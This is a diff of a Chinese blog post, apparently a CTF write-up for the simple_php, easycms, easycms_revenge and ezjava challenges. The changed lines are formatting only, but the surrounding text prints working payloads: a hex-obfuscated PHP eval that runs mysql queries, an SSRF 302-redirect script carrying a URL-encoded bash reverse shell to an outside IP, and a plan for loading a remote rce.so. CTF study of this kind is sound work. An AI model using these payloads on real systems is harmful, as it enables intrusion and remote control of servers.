@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png">
 <meta property="article:published_time" content="2024-05-24T20:31:00.000Z">
-<meta property="article:modified_time" content="2024-05-28T04:57:05.416Z">
+<meta property="article:modified_time" content="2024-05-28T04:59:54.764Z">
 <meta property="article:author" content="Jasper_sec">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="反序列化">
@@ -127,7 +127,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#123"><span class="toc-number">4.1.</span> <span class="toc-text">123</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
       </div>
     
   </span>
@@ -154,7 +154,7 @@
       
         <time datetime="2024-05-24T20:31:00.000Z" class="dt-published" itemprop="datePublished">2024-05-25</time>
         
-        (Updated: <time datetime="2024-05-28T04:57:05.416Z" class="dt-updated" itemprop="dateModified">2024-05-28</time>)
+        (Updated: <time datetime="2024-05-28T04:59:54.764Z" class="dt-updated" itemprop="dateModified">2024-05-28</time>)
         
       
     </div>
@@ -174,12 +174,12 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>主要复现一下ezjava，jdbc attack还是很有意思的</p>
-<h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p>
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要复现一下ezjava，jdbc attack还是很有意思的</p>
+<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png" alt="image-20240525044153901"></p>
-<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>生成二维码的接口可以打ssrf，打302跳转进ssrf，参考下面的链接：<br><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/392-302-ssrfhttp">利用302跳转绕过限制-ssrf仅能使用http协议时 - 火线 Zone-安全攻防社区 (huoxian.cn)</a></p>
+<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>生成二维码的接口可以打ssrf，打302跳转进ssrf，参考下面的链接：<br><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/392-302-ssrfhttp">利用302跳转绕过限制-ssrf仅能使用http协议时 - 火线 Zone-安全攻防社区 (huoxian.cn)</a></p>
 <p>vps上用php -S 0.0.0.0:8080 起一个http服务，写上跳转脚本，利用题目自带的后门反弹shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://127.0.0.1/flag.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%31%36%2e%36%32%2e%33%38%2e%37%31%2f%39%39%39%39%20%30%3e%26%31%22&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
 
@@ -187,7 +187,7 @@
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zecvr9tqvox55jeytq8.cloudeci1.ichunqiu.com/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png" alt="image-20240525044216568"></p>
-<h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><h2 id="123"><a href="#123" class="headerlink" title="123"></a>123</h2><p>getimagesize 那里对$thumb的文件类型有要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png" alt="Pasted image 20240522084222.png" title="wikilink"></p>
+<h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>getimagesize 那里对$thumb的文件类型有要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png" alt="Pasted image 20240522084222.png" title="wikilink"></p>
 <p>我们加一个图片头绕过一下就好了，这里有点坑，要多加几个</p>
 <p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png" alt="image-20240525044243126"></p>
 <p>payload区别不大，注意这里text不能重复，不然不会进代码逻辑</p>
@@ -195,7 +195,7 @@
 
 <p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png" alt="image-20240525044331116"></p>
 <p>PS：上面的方法在比赛可以过，但是在ctfshow的靶场上是过不了的，复现的师傅注意一下。</p>
-<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p>这题有好几种解法，有db文件缓存、sql注入和AspectJWeaver反序列化写文件，下面用的缓存</p>
+<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>这题有好几种解法，有db文件缓存、sql注入和AspectJWeaver反序列化写文件，下面用的缓存</p>
 <p>简单说一下整体思路：</p>
 <ol>
 <li>让client访问vps上的rce.so，利用缓存在client的&#x2F;tmp下写文件（文件名可计算）</li>
@@ -261,7 +261,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#123"><span class="toc-number">4.1.</span> <span class="toc-text">123</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
       </div>
     
 
